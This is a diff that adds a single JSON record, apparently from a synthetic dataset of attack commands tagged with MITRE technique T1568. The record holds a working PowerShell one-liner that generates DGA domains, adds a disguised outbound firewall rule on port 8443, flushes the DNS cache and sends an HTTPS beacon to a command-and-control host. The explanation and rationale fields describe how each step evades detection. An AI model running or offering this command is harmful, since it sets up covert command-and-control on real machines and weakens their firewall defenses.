@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1568",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-Command -ScriptBlock { $seed=(Get-Date -Format 'yyyyMMdd')+$env:COMPUTERNAME.Length; $tlds=@('net','org','co'); $names=1..15|ForEach-Object { 'cdn{0}-{1}.c2sync.{2}' -f $_,$seed,($tlds[(Get-Random -Min 0 -Max $tlds.Count)]) }; netsh advfirewall firewall add rule name='sys_upd_8443' dir=out action=allow protocol=TCP remoteport=8443 | Out-Null; Clear-DnsClientCache; $dom=$names | Where-Object { Resolve-DnsName $_ -Server '1.1.1.1' -Type A -ErrorAction SilentlyContinue } | Select-Object -First 1; if($dom){ $ua='Mozilla/5.0 (Windows NT 10.0; Win64; x64)'; Invoke-WebRequest -Uri ('https://{0}:8443/beacon' -f $dom) -Headers @{ Host=$dom; 'User-Agent'=$ua } -TimeoutSec (Get-Random -Min 3 -Max 9) -UseBasicParsing } }",
+  "explanation": "Generates DGA-based candidate domains, forces resolution via Cloudflare DNS, opens outbound TCP/8443, and performs an HTTPS beacon to the dynamically resolved domain.",
+  "rationale_steps": [
+    "Generate multiple domains using a time-and-hostseed DGA.",
+    "Flush DNS cache and resolve candidates via a chosen resolver (1.1.1.1).",
+    "Open egress on an uncommon port to reduce signature matches.",
+    "Beacon to the first resolvable domain using HTTPS and a benign User-Agent."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1568-5b98f3ee-84d6188c",
+  "source_prompt_hash": "5b98f3ee",
+  "timestamp_utc": "2025-09-30T09:58:10.642945Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
